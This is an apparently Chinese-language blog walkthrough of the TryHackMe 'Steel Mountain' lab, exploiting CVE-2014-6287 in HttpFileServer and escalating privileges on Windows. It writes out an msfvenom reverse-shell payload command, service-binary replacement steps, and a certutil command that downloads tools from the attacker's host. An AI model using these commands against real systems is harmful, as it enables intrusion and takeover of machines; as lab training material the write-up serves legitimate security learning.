@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="房间 靶机难度:简单">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe-Steel_Mountain">
+<meta property="og:url" content="http://atsud0.me/2020/04/14/TryHackMe-Steel-Mountain/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="房间 靶机难度:简单">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586860607002.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586854350058.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586860324381.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586860303117.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586860471087.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586860755905.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586605145063.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586605239465.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586605276987.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586605081000.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586605049835.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586658203435.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586659135376.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586658604586.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586862953454.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-1586851721239.png">
+<meta property="article:published_time" content="2020-04-14T09:02:44.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.459Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="cve-2014-6287">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/image-1586860607002.png">
+
+<link rel="canonical" href="http://atsud0.me/2020/04/14/TryHackMe-Steel-Mountain/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>TryHackMe-Steel_Mountain | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/04/14/TryHackMe-Steel-Mountain/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TryHackMe-Steel_Mountain
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-14 17:02:44" itemprop="dateCreated datePublished" datetime="2020-04-14T17:02:44+08:00">2020-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">靶机实验</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><a href="https://tryhackme.com/room/steelmountain" target="_blank" rel="noopener">房间</a></p>
+<p>靶机难度:简单</p>
+<a id="more"></a>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描之后会发现目标机器开了两个网页服务器<br><img src="https://images.atsud0.me/images/post/image-1586860607002.png" alt="file"><br><img src="https://images.atsud0.me/images/post/image-1586854350058.png" alt="file"></p>
+<p>我们可以访问一下。<br>80端口只有一个图片，<br>并且是IIs8.5版本的中间件.<br>而8080则是一个httpfileserver 2.3版本的中间件。<br><img src="https://images.atsud0.me/images/post/image-1586860324381.png" alt="file"><br><img src="https://images.atsud0.me/images/post/image-1586860303117.png" alt="file"><br>对这服务版本进行漏洞检索<br><img src="https://images.atsud0.me/images/post/image-1586860471087.png" alt="file"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>发现有存在可利用的漏洞，进msf看看。<br><img src="https://images.atsud0.me/images/post/image-1586860755905.png" alt="file"><br>设置好目标端口和IP后，开始利用就好。<br><img src="https://images.atsud0.me/images/post/image-1586605145063.png" alt="file"><br>已经拿到初步后门，但是权限仅限于bill用户</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://images.atsud0.me/images/post/image-1586605239465.png" alt="file"><br>上传PowerUp.ps1文件，你可以在<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">这里</a>下载<br>这个脚本的作用是枚举目标机器并确定该机器上的异常服务错误的权限配置</p>
+<blockquote>
+<p>To enumerate this machine, we will use a powershell script called PowerUp, that’s purpose is to evaluate a Windows machine and determine any abnormalities - “PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.”</p>
+</blockquote>
+<p>关于这个脚本更多的信息可以查看<a href="https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/" target="_blank" rel="noopener">这里</a></p>
+<p>执行这个脚本，执行这个脚本之前我们需要先载入powershell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_shell 开启powershell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-1586605276987.png" alt="file"><br>拿到flag1</p>
+<p><img src="https://images.atsud0.me/images/post/image-1586605081000.png" alt="file"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerUp.ps1</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-1586605049835.png" alt="file"><br>关注AdvancedSystemCareService9这个服务的CanRestart,如果它为True，说明我们可以手动去关闭这个服务，并使用非法的木马程序替换掉合法的程序。</p>
+<p><img src="https://images.atsud0.me/images/post/image-1586658203435.png" alt="file"><br>生成木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;IP LPORT&#x3D;443 -e x86&#x2F;shikata_ga_nai -f exe -o ASCService.exe</span><br></pre></td></tr></table></figure>
+<p>将服务关闭后，切换到服务程序所在路径。上传由我们生成的ASCService.exe替换掉原来的ASCService.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc stop [servicename]</span><br><span class="line">upload ASCService.exe</span><br><span class="line">sc start [servicename]</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/image-1586659135376.png" alt="file"></p>
+<p><img src="https://images.atsud0.me/images/post/image-1586658604586.png" alt="file"><br>拿到root权限。</p>
+<h2 id="额外练习——不使用msf利用cve2014-6287"><a href="#额外练习——不使用msf利用cve2014-6287" class="headerlink" title="额外练习——不使用msf利用cve2014-6287"></a>额外练习——不使用msf利用cve2014-6287</h2><p><a href="https://www.exploit-db.com/exploits/39161" target="_blank" rel="noopener">expolit</a><br>这个exp也是我们在上面所利用的。而这一次，我们不使用msf，去使用这个exploit。<br>为了达到这一目标，我们需要有一个web服务器，nc监听端口。所以要打开多个终端。<br>并且我们需要下载<a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe" target="_blank" rel="noopener">nc.exe</a><br>将下载的ncat.exe改名字为nc.exe后，放在你web的根目录，因为我们只是执行渗透攻击流程，并不需要什么很好看功能强大的网站。<br>我们可以直接使用python来运行一个网站。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPService</span><br></pre></td></tr></table></figure>
+<p>修改下载好的exp的IP和监听端口配置。<br><img src="https://images.atsud0.me/images/post/image-1586862953454.png" alt="file"><br>开启另外一个终端，开始监听。同时，执行exploit文件，以获得初步shell。<br>你需要执行两次exploit，因为它第一次执行，是将nc.exe拉入目标系统中，而第二次则是执行我们的有效负载获得回调。</p>
+<blockquote>
+<p>You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!</p>
+</blockquote>
+<p>房间这里向我们介绍了另外一个windows下的枚举信息的脚本——winPEAS它和LinEnum.sh差不多。<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noopener">这里下载</a><br>但是拿到cmd shell之后怎我们怎么上传我们的木马来替换合法的服务程序或者说是枚举脚本呢？<br>因为我们是开启了一个web服务器的，所以 我们可以把要上传的文件放在网站根目录下。在目标机器cmd shell 中运行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;ip&#x2F;winPEAS.exe</span><br></pre></td></tr></table></figure>
+<p>然后我们就可以使用winPEAS.exe进行枚举了。<br>我们也可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;get-service&quot;</span><br></pre></td></tr></table></figure>
+<p>来看本机运行的服务名称<br>最后的提权步骤，和上面的提权步骤是相同的。<br><img src="https://images.atsud0.me/images/post/image-1586851721239.png" alt="file"></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/04/14/TryHackMe-Steel-Mountain/" title="TryHackMe-Steel_Mountain">http://atsud0.me/2020/04/14/TryHackMe-Steel-Mountain/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Metasploit/" rel="tag"><i class="fa fa-tag"></i> Metasploit</a>
+              <a href="/tags/cve-2014-6287/" rel="tag"><i class="fa fa-tag"></i> cve-2014-6287</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/14/manjaro%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/" rel="prev" title="manjaro安装记录">
+      <i class="fa fa-chevron-left"></i> manjaro安装记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/16/sql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" rel="next" title="sql基本操作">
+      sql基本操作 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提权"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#额外练习——不使用msf利用cve2014-6287"><span class="nav-number">4.</span> <span class="nav-text">额外练习——不使用msf利用cve2014-6287</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">6:10</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
